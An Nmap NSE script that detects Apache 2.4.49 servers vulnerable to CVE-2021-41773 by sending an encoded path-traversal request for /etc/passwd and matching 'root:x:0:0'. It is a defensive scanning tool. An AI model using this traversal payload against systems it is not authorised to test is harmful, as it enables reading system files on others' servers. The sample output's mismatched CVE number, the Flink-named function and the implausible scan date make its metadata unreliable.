description = [[
Identifies servers vulnerable to Apache 2.4.49 Path traversal (CVE-2021-41773).
]]


---
-- @usage 
-- nmap --script  CVE-2021-41773.nse <target>
-- nmap -sV --script  CVE-2021-41773.nse <target>
--
-- @output
-- Scanned at 2021-01-06 15:55:34 UTC for 2s
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack ttl 49
-- | apache-traversal: 
-- |   VULNERABLE:
-- |   Host is vulnerable to CVE-2021-41773
-- |     State: VULNERABLE
-- |       Checks if Server is vulnerable to Apache 2.4.49 CVE-2020-17519
-- |           
-- |     References:
-- |_      https://github.com/TishcaTpx/POC-CVE-2021-41773
-- |_      https://httpd.apache.org/security/vulnerabilities_24.html
---

author = "George Labrin"
categories = {"discovery", "vuln"}

local http = require "http"
local vulns = require 'vulns'
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local json = require "json"

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

-- @param host Hostname
-- @param port Port number
-- @return True if response is 200 and contains root:x:0:0 in body
local function check_flink(host, port)  
    path = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'  
  
    stdnse.debug2("Checking Apache 2.4.49 Vulnerability")

    req = http.get(host, port, path , nil , nil, nil)
    
    if req.status and req.status == 200 and string.find(req.body, "root:x:0:0") then
        return true
    else
        stdnse.debug2("Not vulnerable to CVE-2021-41773")
    end

   return false
end

---
--main
---
action = function(host, port)
  local vuln = {
    state = vulns.STATE.NOT_VULN,
    description = [[
Checks if Server is vulnerable to Apache 2.4.49 CVE-2021-41773
    ]],
    references = {
        'https://github.com/TishcaTpx/POC-CVE-2021-41773'
    }
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  stdnse.debug1("CVE-2021-41773 check is in progress")
  result = check_flink(host, port)
  
  if result then
    stdnse.debug1("Host is vulnerable..")
    vuln.title = 'Host is vulnerable to CVE-2021-41773'
    vuln.state = vulns.STATE.VULN
  end

  return vuln_report:make_output(vuln)

end
